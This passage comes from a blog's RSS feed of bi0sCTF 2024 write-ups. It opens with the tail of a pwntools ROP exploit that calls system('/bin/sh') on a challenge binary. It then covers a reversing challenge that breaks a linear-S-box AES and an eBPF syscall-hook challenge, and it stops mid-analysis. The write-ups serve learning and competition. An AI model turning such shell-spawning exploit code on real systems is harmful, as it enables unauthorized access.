class=&#34;number&#34;&gt;0x1ed723&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# get the address of the pop rdi gadget from the offset we got earlier &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prdi = libc.address + &lt;span class=&#34;number&#34;&gt;0x0000000000023b6a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# get the address of the ret gadget &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = libc.address + &lt;span class=&#34;number&#34;&gt;0x0000000000022679&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# send the payload as we had seen above, to overwrite rip, replace rdi with &amp;quot;/bin/sh&amp;quot;, and finally call system &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(&lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x7361754569205965&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(ret) + p64(prdi) + p64(&lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;))) + p64(libc.sym.system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So that is the entire challenge! A unique reversing + binary exploitation to top it all off.&lt;/p&gt;
&lt;p&gt;If you guys have any questions about anything mentioned in the writeups, feel free to reach out to me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94LmNvbS90aGVfbTNjaGFuaWNf&#34;&gt;X/Twitter&lt;/span&gt; or on Discord at  &lt;code&gt;the.m3chanic&lt;/code&gt; . Cheers.&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://the-m3chanic.github.io/2024/02/26/Writeup-t0y-b0x-bi0sCTF-2024/</guid>
            <title>Writeup - t0y-b0x - bi0sCTF 2024</title>
            <link>https://the-m3chanic.github.io/2024/02/26/Writeup-t0y-b0x-bi0sCTF-2024/</link>
            <category term="Writeup" scheme="https://the-m3chanic.github.io/categories/Writeup/" />
            <category term="Reversing" scheme="https://the-m3chanic.github.io/tags/Reversing/" />
            <category term="CTF" scheme="https://the-m3chanic.github.io/tags/CTF/" />
            <category term="Writeup" scheme="https://the-m3chanic.github.io/tags/Writeup/" />
            <category term="Crypto" scheme="https://the-m3chanic.github.io/tags/Crypto/" />
            <pubDate>Mon, 26 Feb 2024 17:09:06 +0000</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Binary obfuscation with hidden anti-debug checks&lt;/li&gt;
&lt;li&gt;Linear Cryptanalysis (AES with linearly dependent SBOX)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Challenge points&lt;/strong&gt;: 758&lt;br /&gt;
&lt;strong&gt;No. of solves&lt;/strong&gt;: 21&lt;br /&gt;
&lt;strong&gt;Challenge Author(s)&lt;/strong&gt; : &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9TYXJpbktyaXNobmFuUg==&#34;&gt;Sans&lt;/span&gt;, &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS90aGVfbTNjaGFuaWNf&#34;&gt;the.m3chanic&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;challenge-description&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#challenge-description&#34;&gt;#&lt;/a&gt; Challenge description:&lt;/h2&gt;
&lt;p&gt;All my toys are shuffled 😦&lt;/p&gt;
&lt;h2 id=&#34;initial-analysis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#initial-analysis&#34;&gt;#&lt;/a&gt; Initial Analysis&lt;/h2&gt;
&lt;p&gt;We&#39;re given a stripped C binary along with a  &lt;code&gt;ciphertext.txt&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We see that the binary is asking for up to 16 bytes of input followed by upto 1024 bytes in the next line - already kind of suspicious, hints AES, but let&#39;s see.&lt;/p&gt;
&lt;p&gt;Now right off the bat, there&#39;s a conditional check to set an array to one or the other value based on a global variable, let&#39;s check that out.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image-1.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;There are only 2 xrefs to this global symbol, one of them which we are currently checking out - whereas the other one seems to be in another function.&lt;/p&gt;
&lt;p&gt;IDA is unable to decompile it properly, but it says that the function has inline assembly present in it - let&#39;s look at that.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image-2.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This looks like a fancy way of setting up a syscall, specifically  &lt;code&gt;ptrace&lt;/code&gt; , so it&#39;s an anti-debug check.&lt;br /&gt;
We can simply patch the jump condition, or nop out this entire function itself - up to whoever is reversing it.&lt;/p&gt;
&lt;p&gt;The output of this function seems to change the values that a specific array is set to, which we&#39;ll find to be important later.&lt;br /&gt;
Additionally, the array that is being set is of length 256, another AES hint.&lt;/p&gt;
&lt;p&gt;The array that is copied into this is initialised from another function, which you can analyse by debugging and see that all it does is initialise an array with values from 0-255.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image-3.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This looks like the mix columns function from AES, it also calls the  &lt;code&gt;coef_mult&lt;/code&gt;  that is implemented in AES.&lt;/p&gt;
&lt;p&gt;At this point we can conclude that this binary is implementing AES, but with some modifications to it. The only modification being that the SBOX being used in it is linear (0, 1, 2...255). We can find this out by inspecting the arguments being passed to the  &lt;code&gt;aes_encrypt&lt;/code&gt;  function in main.&lt;/p&gt;
&lt;h2 id=&#34;solving-linear-aes&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#solving-linear-aes&#34;&gt;#&lt;/a&gt; Solving linear AES&lt;/h2&gt;
&lt;p&gt;Looking at the implementation of the  &lt;code&gt;sub_bytes&lt;/code&gt;  function in the binary, we can see this&lt;br /&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub_bytes&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; *state)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; i, j;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (j = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; j &amp;lt; Nb; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			state[Nb*i+j] = s_box[state[Nb*i+j]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This is the only non-linear part of AES, and it&#39;s what makes AES resistant to linear attacks. The standard SBOX was designed with this in mind. In this binary, however, we use a linear SBOX.&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;X&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;⊕&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;⊕&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;X&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo&gt;⊕&lt;/mo&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;X&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo&gt;⊕&lt;/mo&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;X&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;SBOX[i \oplus j \oplus 0] = SBOX[i] \oplus SBOX[j] \oplus SBOX[0]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;⊕&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;⊕&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;⊕&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;⊕&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The new substitution box can be represented as a linear operation on bits, with just XORs and shuffling bits. Because of this - the AES encryption operation is now affine. Since the first block of plaintext and ciphertext, you can construct a matrix and recover the key this way, using it to decrypt the rest of the ciphertext.&lt;/p&gt;
&lt;p&gt;You can refer to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYWNrbWQuaW8vQHZpc2hpc3dvei9yMTBQN2tud2o=&#34;&gt;this&lt;/span&gt; and &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9rZXZpbmxpdS5tZS9wb3N0cy9saW5lYXItY3J5cHRhbmFseXNpcy8=&#34;&gt;this&lt;/span&gt; article for more information on this vulnerability.&lt;/p&gt;
&lt;p&gt;Overall, this was an easy to medium challenge, with just some obfuscation to hide some things being generated in the binary and a vulnerable implementation of AES being implemented. I hope you guys had fun solving the challenge and learnt something new from it as well! 😃&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://the-m3chanic.github.io/2024/02/26/Writeup-beehive-bi0sCTF-2024/</guid>
            <title>Writeup - beehive - bi0sCTF 2024</title>
            <link>https://the-m3chanic.github.io/2024/02/26/Writeup-beehive-bi0sCTF-2024/</link>
            <category term="Writeup" scheme="https://the-m3chanic.github.io/categories/Writeup/" />
            <category term="Security" scheme="https://the-m3chanic.github.io/tags/Security/" />
            <category term="Reversing" scheme="https://the-m3chanic.github.io/tags/Reversing/" />
            <category term="CTF" scheme="https://the-m3chanic.github.io/tags/CTF/" />
            <category term="eBPF" scheme="https://the-m3chanic.github.io/tags/eBPF/" />
            <category term="Writeup" scheme="https://the-m3chanic.github.io/tags/Writeup/" />
            <pubDate>Mon, 26 Feb 2024 03:23:31 +0000</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Custom hook to syscall 0x31337 using eBPF&lt;/li&gt;
&lt;li&gt;Check on the argument passed to syscall to verify correct/incorrect key&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenge-description&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#challenge-description&#34;&gt;#&lt;/a&gt; Challenge description:&lt;/h2&gt;
&lt;p&gt;according to all known laws of aviation, there is no way a bee should be able to fly&lt;/p&gt;
&lt;p&gt;In this writeup I&#39;ll be covering the challenge I authored for bi0s CTF, 2024.&lt;br /&gt;
I intended for this to be an easy warmup challenge for the players, and hopefully some people learned some new stuff from it as well 😃&lt;/p&gt;
&lt;h2 id=&#34;initial-analysis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#initial-analysis&#34;&gt;#&lt;/a&gt; Initial Analysis&lt;/h2&gt;
&lt;p&gt;In the handout, there is a single file,  &lt;code&gt;beehive.o&lt;/code&gt; , let&#39;s take a look at what kind of file it is&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-beehive-bi0sCTF-2024/image.png&#34; alt=&#34;file type&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So it&#39;s an ELF file, but of type eBPF. What is eBPF?&lt;/p&gt;
&lt;p&gt;(I&#39;m going to dive a little deep into eBPF and things surrounding it. If you&#39;re only here for the solution to the challenge, you can skip to the &lt;a href=&#34;#the-solution&#34;&gt;solution&lt;/a&gt;)&lt;/p&gt;
&lt;h2 id=&#34;understanding-ebpf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#understanding-ebpf&#34;&gt;#&lt;/a&gt; Understanding eBPF&lt;/h2&gt;
&lt;p&gt;eBPF is a technology that can be used in the Linux kernel that is like running a very tightly bound (ability-wise) program directly in the kernel space. It is an event-driven language that can be used to hook kernel actions and perform specific tasks.&lt;/p&gt;
&lt;p&gt;It runs natively in the kernel space with the help of a JIT compiler.&lt;/p&gt;
&lt;p&gt;It’s basically a kernel level virtual machine that allows for programming of certain kernel level tasks, such as packet filtering, tracing, etc. Essentially a small computer inside the kernel that can run custom programs with restricted access.&lt;/p&gt;
&lt;p&gt;Basically, think of it as a Kernel level javascript running inside a restrictive VM.&lt;/p&gt;
&lt;p&gt;The obvious question that might come in your mind is - &lt;strong&gt;How is eBPF different from normal kernel drivers or kernel modules&lt;/strong&gt;?&lt;/p&gt;
&lt;p&gt;Well, the answer to that is simple:&lt;br /&gt;
eBPF programs don’t have nearly the amount of permissions as a regular kernel module, so you could say that they run in a much more constrained environment. They can’t make any drastic changes to the behaviour of the kernel, so this adds to their security and can help in reducing crashes. It’s  perfectly in between a user program and a kernel program, in the sense that it runs in the kernel space, but with restrictions that differentiate it from an actual kernel module.&lt;/p&gt;
&lt;p&gt;Now that we&#39;ve got the basics out of the way, let&#39;s get back to solving the challenge.&lt;/p&gt;
&lt;h2 id=&#34;our-approach&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#our-approach&#34;&gt;#&lt;/a&gt; Our Approach&lt;/h2&gt;
&lt;p&gt;Some google searches tell us that eBPF can be disassembled using  &lt;code&gt;llvm&lt;/code&gt; , so let&#39;s give that a try&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-beehive-bi0sCTF-2024/image-1.png&#34; alt=&#34;llvm output&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Sure enough, we get the output, and in that we see a function called  &lt;code&gt;weird_function&lt;/code&gt; , now let&#39;s take a look at what it does&lt;/p&gt;
&lt;p&gt;One thing to keep in mind is: eBPF has its own instruction set architecture, so everything from registers to calling convention will be different&lt;/p&gt;
&lt;p&gt;Quick overview of eBPF architecture:&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eBPF is a RISC register machine with 11 registers in total. Each 64-bits in size. &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9 of these registers are general purpose, with arbitrary read-write over each of them. One register is a read-only stack pointer, and one implicit program counter (in the sense, we can only jump to a particular offset with it). &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;The VM registers are always 64-bits wide, even if it’s running on a 32-bit processor, the rest of the bits are just zeroed out in that case. &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r0 register holds the return value of helper function calls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r1-r5 hold the function arguments for kernel function calls, r6-r9 are callee saved registers &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r0 also stores the exit value when the eBPF program exits from the kernel.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;understanding-the-challenge&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#understanding-the-challenge&#34;&gt;#&lt;/a&gt; Understanding the challenge&lt;/h2&gt;
&lt;p&gt;Now, the first few instructions from the dump kind of give us an idea of what&#39;s going on here.&lt;/p&gt;
&lt;p&gt;A bunch of stuff is loaded on the stack first, following which the last value loaded on top is later compared to 0x31337.&lt;/p&gt;
&lt;p&gt;In eBPF, whenever a syscall is made, arguments passed to the syscall are pushed on the stack in reverse order, and the syscall number is pushed last (i.e, at the top). We can see that our program is doing something similar here.&lt;/p&gt;
&lt;p&gt;We know that eBPF harbours the capability to hook onto syscalls on the kernel, so could it be possible that it is trying to hook onto syscall 0x31337?&lt;br /&gt;
Let&#39;s confirm that hunch.&lt;/p&gt;
&lt;p&gt;A failed comparison of the syscall number with 0x31337 leads us to label-18, which is&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-beehive-bi0sCTF-2024/image-2.png&#34; alt=&#34;exit label&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So I think we would need to make the syscall number 0x31337 to interact with this program. But what do we pass to it?&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-beehive-bi0sCTF-2024/image-3.png&#34; alt=&#34;strings output&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Seems like the program is asking for a key, and verifies that key for us.&lt;/p&gt;
&lt;p&gt;Obviously the entire program can&#39;t be efficiently analysed using just the object dump, so I will switch to IDA PRO for the remainder of this writeup.&lt;br /&gt;
By default, IDA is not capable of recognising this machine type, but there is a handy &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N5bGFuY2UvZUJQRl9wcm9jZXNzb3I=&#34;&gt;processor&lt;/span&gt; plugin that supports eBPF.&lt;/p&gt;
&lt;p&gt;The output still doesn&#39;t look too clean on IDA, so we can run the scripts on the processor repo to relocate maps and clean up eBPF helper calls for us.&lt;/p&gt;
&lt;p&gt;(To run script files on IDA: File -&amp;gt; Script file -&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ZpbGVuYW1lLnB5&#34;&gt;filename.py&lt;/span&gt;)&lt;/p&gt;
&lt;p&gt;The first few blocks of the disassembly seem to be telling us some pretty obvious things, it takes input, copies it to a kernel land string, then stores it.&lt;/p&gt;
&lt;p&gt;How does it reference it though?&lt;br /&gt;
Let&#39;s look at this logically - we know the binary has a print statement somewhere, and it prints 1 of 2 things&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-beehive-bi0sCTF-2024/image-5.png&#34; alt=&#34;correct incorrect print&#34; /&gt;&lt;/p&gt;
&lt;p&gt;How is it referencing the correct and incorrect strings?&lt;/p&gt;
